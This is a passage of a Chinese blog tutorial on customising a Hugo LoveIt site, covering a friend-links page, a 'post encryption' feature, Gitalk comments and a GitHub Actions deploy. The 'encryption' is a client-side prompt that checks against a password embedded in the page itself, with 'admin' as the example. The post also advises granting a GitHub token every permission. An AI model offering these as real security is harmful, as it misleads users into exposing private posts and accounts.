</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-scss" data-lang="scss"><span class="line"><span class="cl"><span class="nc">.friendurl</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">text-decoration</span><span class="o">:</span> <span class="ni">none</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">color</span><span class="o">:</span> <span class="no">black</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.myfriend</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">width</span><span class="o">:</span> <span class="mi">56</span><span class="kt">px</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">height</span><span class="o">:</span> <span class="mi">56</span><span class="kt">px</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">border-radius</span><span class="o">:</span> <span class="mi">50</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">border</span><span class="o">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="ni">solid</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">padding</span><span class="o">:</span> <span class="mi">2</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">box-shadow</span><span class="o">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="mi">1</span><span class="kt">px</span> <span class="mi">1</span><span class="kt">px</span> <span class="nf">rgba</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="mf">.15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-top</span><span class="o">:</span> <span class="mi">14</span><span class="kt">px</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-left</span><span class="o">:</span> <span class="mi">14</span><span class="kt">px</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">background-color</span><span class="o">:</span> <span class="mh">#fff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddiv</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">height</span><span class="o">:</span> <span class="mi">92</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-top</span><span class="o">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">width</span><span class="o">:</span> <span class="mi">48</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">display</span><span class="o">:</span> <span class="ni">inline-block</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">border-radius</span><span class="o">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">background</span><span class="o">:</span> <span class="nf">rgba</span><span class="p">(</span><span class="mi">255</span><span class="o">,</span> <span class="mi">255</span><span class="o">,</span> <span class="mi">255</span><span class="o">,</span> <span class="mi">0</span><span class="mf">.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="na">box-shadow</span><span class="o">:</span> <span class="mi">4</span><span class="kt">px</span> <span class="mi">4</span><span class="kt">px</span> <span class="mi">2</span><span class="kt">px</span> <span class="mi">1</span><span class="kt">px</span> <span class="nf">rgba</span><span class="p">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">255</span><span class="o">,</span> <span class="mi">0</span><span class="mf">.2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddiv</span><span class="nd">:hover</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">background</span><span class="o">:</span> <span class="nf">rgba</span><span class="p">(</span><span class="mi">87</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">224</span><span class="o">,</span> <span class="mi">0</span><span class="mf">.15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddiv</span><span class="nd">:hover</span> <span class="nc">.frienddivleft</span> <span class="nt">img</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">transition</span><span class="o">:</span> <span class="mi">0</span><span class="mf">.9</span><span class="kt">s</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-webkit-transition</span><span class="o">:</span> <span class="mi">0</span><span class="mf">.9</span><span class="kt">s</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-moz-transition</span><span class="o">:</span> <span class="mi">0</span><span class="mf">.9</span><span class="kt">s</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-o-transition</span><span class="o">:</span> <span class="mi">0</span><span class="mf">.9</span><span class="kt">s</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-ms-transition</span><span class="o">:</span> <span class="mi">0</span><span class="mf">.9</span><span class="kt">s</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">transform</span><span class="o">:</span> <span class="nf">rotate</span><span class="p">(</span><span class="mi">360</span><span class="kt">deg</span><span class="p">)</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-webkit-transform</span><span class="o">:</span> <span class="nf">rotate</span><span class="p">(</span><span class="mi">360</span><span class="kt">deg</span><span class="p">)</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-moz-transform</span><span class="o">:</span> <span class="nf">rotate</span><span class="p">(</span><span class="mi">360</span><span class="kt">deg</span><span class="p">)</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-o-transform</span><span class="o">:</span> <span class="nf">rotate</span><span class="p">(</span><span class="mi">360</span><span class="kt">deg</span><span class="p">)</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">-ms-transform</span><span class="o">:</span> <span class="nf">rotate</span><span class="p">(</span><span class="mi">360</span><span class="kt">deg</span><span class="p">)</span> <span class="k">!important</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddivleft</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">width</span><span class="o">:</span> <span class="mi">92</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">float</span><span class="o">:</span> <span class="ni">left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddivleft</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-right</span><span class="o">:</span> <span class="mi">2</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.frienddivright</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-top</span><span class="o">:</span> <span class="mi">18</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">margin-right</span><span class="o">:</span> <span class="mi">18</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.friendname</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">text-overflow</span><span class="o">:</span> <span class="ni">ellipsis</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">overflow</span><span class="o">:</span> <span class="ni">hidden</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">white-space</span><span class="o">:</span> <span class="ni">nowrap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nc">.friendinfo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="na">text-overflow</span><span class="o">:</span> <span class="ni">ellipsis</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">overflow</span><span class="o">:</span> <span class="ni">hidden</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="na">white-space</span><span class="o">:</span> <span class="ni">nowrap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="k">@media</span> <span class="ni">screen</span> <span class="ow">and</span> <span class="p">(</span><span class="na">max-width</span><span class="o">:</span> <span class="mi">600</span><span class="kt">px</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nc">.friendinfo</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="na">display</span><span class="o">:</span> <span class="ni">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nc">.frienddivleft</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="na">width</span><span class="o">:</span> <span class="mi">84</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="na">margin</span><span class="o">:</span> <span class="ni">auto</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nc">.frienddivright</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="na">height</span><span class="o">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="na">margin</span><span class="o">:</span> <span class="ni">auto</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="na">display</span><span class="o">:</span> <span class="ni">flex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="na">align-items</span><span class="o">:</span> <span class="ni">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="na">justify-content</span><span class="o">:</span> <span class="ni">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nc">.friendname</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="na">font-size</span><span class="o">:</span> <span class="mi">14</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">   
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="assetscss_page-下面新建-_singlescss-文件"><code>assets/css/_page/</code> 下面新建 <code>_single.scss</code> 文件</h5>
<blockquote>
<p>把主题 <code>/themes/loveIt/assets/css/_page/_single.scss</code> 的文件拷贝到博客项目指定目录，关键在于添加一行 <code>@import &quot;../_partial/_single/_friend&quot;;</code></p>
</blockquote>
<p>在 <code>content/friend</code> 下新建 <code>index.语言.md</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">hiddenFromSearch: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">
<a target="_blank" href=%e9%93%be%e6%8e%a5 title=name class="friendurl">
  <div class="frienddiv">
    <div class="frienddivleft">
      <img class="myfriend" src=logo%e7%9a%84url />
    </div>
    <div class="frienddivright">
      <div class="friendname">name</div>
      <div class="friendinfo">描述</div>
    </div>
  </div>
</a>

</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230217191802046.png" /></p>
<h4 id="增加加密功能">增加加密功能</h4>
<ul>
<li>新建 <code>layouts/posts/single.html</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir layouts/posts/ &amp;&amp; cp themes/LoveIt/layouts/posts/single.html layouts/posts/single.html
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>创建文件 <code>static/js/pwd.js</code> ，代码如下</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function getCookie(cname) {
</span></span><span class="line"><span class="cl">    var name = cname + &#34;=&#34;;
</span></span><span class="line"><span class="cl">    var ca = document.cookie.split(&#39;;&#39;);
</span></span><span class="line"><span class="cl">    for (var i = 0; i &lt; ca.length; i++) {
</span></span><span class="line"><span class="cl">        var c = ca[i].trim();
</span></span><span class="line"><span class="cl">        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    return &#34;&#34;;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function checkCookie(cname, cvvalue) {
</span></span><span class="line"><span class="cl">    var cvalue = getCookie(cname);
</span></span><span class="line"><span class="cl">    if (cvalue != &#34;&#34; &amp;&amp; cvalue === cvvalue) {
</span></span><span class="line"><span class="cl">        return true;
</span></span><span class="line"><span class="cl">    } else {
</span></span><span class="line"><span class="cl">        return false;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function setCookie(cname, cvalue, exhours) {
</span></span><span class="line"><span class="cl">    var d = new Date();
</span></span><span class="line"><span class="cl">    var h = 60 * 60 * 1000
</span></span><span class="line"><span class="cl">    d.setTime(d.getTime() + (exhours * h));
</span></span><span class="line"><span class="cl">    var expires = &#34;expires=&#34; + d.toGMTString();
</span></span><span class="line"><span class="cl">    document.cookie = cname + &#34;=&#34; + cvalue + &#34;; &#34; + expires + &#34;; path=/&#34;;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">function errorPwd() {
</span></span><span class="line"><span class="cl">    alert(&#39;密码错误！&#39;);
</span></span><span class="line"><span class="cl">    if (history.length === 1) {
</span></span><span class="line"><span class="cl">        window.opener = null;
</span></span><span class="line"><span class="cl">        window.open(&#39;&#39;, &#39;_self&#39;);
</span></span><span class="line"><span class="cl">        window.close();
</span></span><span class="line"><span class="cl">    } else {
</span></span><span class="line"><span class="cl">        history.back();
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    return false;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>向 <code>layouts/posts/single.html</code> 中的 <code>{{- $params := .Scratch.Get &quot;params&quot; -}}</code> 之后添加如下代码</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="p">{{</span><span class="o">-</span> <span class="nx">$password</span> <span class="o">:=</span> <span class="nx">$params</span><span class="p">.</span><span class="nx">password</span> <span class="o">|</span> <span class="k">default</span> <span class="s2">&#34;&#34;</span> <span class="o">-</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">    <span class="p">{{</span><span class="o">-</span> <span class="nx">$encryptedKey</span> <span class="o">:=</span> <span class="nx">$params</span><span class="p">.</span><span class="nx">encryptedKey</span> <span class="o">|</span> <span class="k">default</span> <span class="s2">&#34;&#34;</span> <span class="o">-</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">    <span class="p">{{</span><span class="o">-</span> <span class="k">if</span> <span class="nx">ne</span> <span class="nx">$password</span> <span class="s2">&#34;&#34;</span> <span class="o">-</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">noscript</span><span class="o">&gt;&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;0; url=/404.html&#34;</span> <span class="o">/&gt;&lt;</span><span class="err">/noscript&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/js/pwd.js&#34;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="s2">&#34;none&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">({{</span> <span class="nx">$password</span> <span class="p">}}){</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">({{</span> <span class="nx">$encryptedKey</span> <span class="p">}}){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">checkCookie</span><span class="p">({{</span> <span class="nx">$encryptedKey</span> <span class="p">}},{{</span> <span class="nx">$password</span> <span class="p">}}))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="p">(</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;请输入文章密码&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="p">{{</span> <span class="nx">$password</span> <span class="p">}}){</span>
</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="nx">errorPwd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="nx">setCookie</span><span class="p">({{</span> <span class="nx">$encryptedKey</span> <span class="p">}},{{</span> <span class="nx">$password</span> <span class="p">}},</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;请输入文章密码&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="p">{{</span> <span class="nx">$password</span> <span class="p">}}){</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="nx">errorPwd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="s2">&#34;inherit&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">})();</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{{</span><span class="o">-</span> <span class="nx">end</span> <span class="o">-</span><span class="p">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>posts下面 的文章中使用 : <code>password</code> =&gt; 密码</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">password: &#34;admin&#34;
</span></span><span class="line"><span class="cl">---
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="增加评论">增加评论</h4>
<p>使用gitalk就好<a href="https://www.techkoala.net/hugo_loveit_q_a/" target="_blank" rel="noopener noreffer ">参考</a></p>
<h5 id="network-error">network error</h5>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230629170402863.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230629170402863.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230629170402863.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230629170402863.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230629170402863.png"
        title="image-20230629170402863" /></p>
<p>将该域名改成代理即可</p>
<h4 id="配置github-action">配置github action</h4>
<p>在settings-&gt;developer settings-&gt;personal access tokens-&gt;tokens ( classic)里面添加一个personal key把所有的权限都打上，然后将key记录下来</p>
<p>创建两个分支：</p>
<p>一个blog (用来保存hugo网站目录)</p>
<p>一个master(用来保存blog目录)</p>
<p>在根目录建立.github/workflows/mian.yml</p>
<p>内容如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name: GitHub Page Deploy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">on:
</span></span><span class="line"><span class="cl">  push:
</span></span><span class="line"><span class="cl">    branches:
</span></span><span class="line"><span class="cl">      - blog
</span></span><span class="line"><span class="cl">jobs:
</span></span><span class="line"><span class="cl">  build-deploy:
</span></span><span class="line"><span class="cl">    runs-on: ubuntu-latest
</span></span><span class="line"><span class="cl">    steps:
</span></span><span class="line"><span class="cl">      - name: Checkout master
</span></span><span class="line"><span class="cl">        uses: actions/checkout@v1      
</span></span><span class="line"><span class="cl">        with:
</span></span><span class="line"><span class="cl">          submodules: true
</span></span><span class="line"><span class="cl">      - name: Setup Hugo
</span></span><span class="line"><span class="cl">        uses: peaceiris/actions-hugo@v2
</span></span><span class="line"><span class="cl">        with:
</span></span><span class="line"><span class="cl">          hugo-version: &#34;0.110.0&#34;
</span></span><span class="line"><span class="cl">          extended: true
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      - name: Build Hugo
</span></span><span class="line"><span class="cl">        run: |
</span></span><span class="line"><span class="cl">              hugo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      - name: Deploy Hugo to gh-pages
</span></span><span class="line"><span class="cl">        uses: peaceiris/actions-gh-pages@v2
</span></span><span class="line"><span class="cl">        env:
</span></span><span class="line"><span class="cl">          PERSONAL_TOKEN: ${{ secrets.ACTIONS_DEPLOY_KEY }}
</span></span><span class="line"><span class="cl">          EXTERNAL_REPOSITORY: cnitlrt/cnitlrt.github.io
</span></span><span class="line"><span class="cl">          PUBLISH_BRANCH: master
</span></span><span class="line"><span class="cl">          PUBLISH_DIR: ./public
</span></span><span class="line"><span class="cl">          commit_message: ${{ github.event.head_commit.message }}
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>其中ACTIONS_DEPLOY_KEY在仓库-&gt;settings-&gt;secrets and variables-&gt;actions新建名字为ACTIONS_DEPLOY_KEY的secret里面的内容填之前的那个personal key</p>
</li>
<li>
<p>EXTERNAL_REPOSITORY: 填入自己的仓库</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hugo &amp;&amp; git add . &amp;&amp; git commit -m &#34;test&#34; &amp;&amp; git push -u origin blog
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230129170153191.png" /></p>
<h4 id="更改网站图标">更改网站图标</h4>
<p><a href="https://realfavicongenerator.net/" target="_blank" rel="noopener noreffer ">https://realfavicongenerator.net/</a></p>
<p>下载下来放入static目录下面。</p>
<h4 id="修改模板">修改模板</h4>
<p>将<code>根目录\archetypes</code>下的<code>default.md</code>修改如下：</p>
<div class="highlight"><div class="chroma">
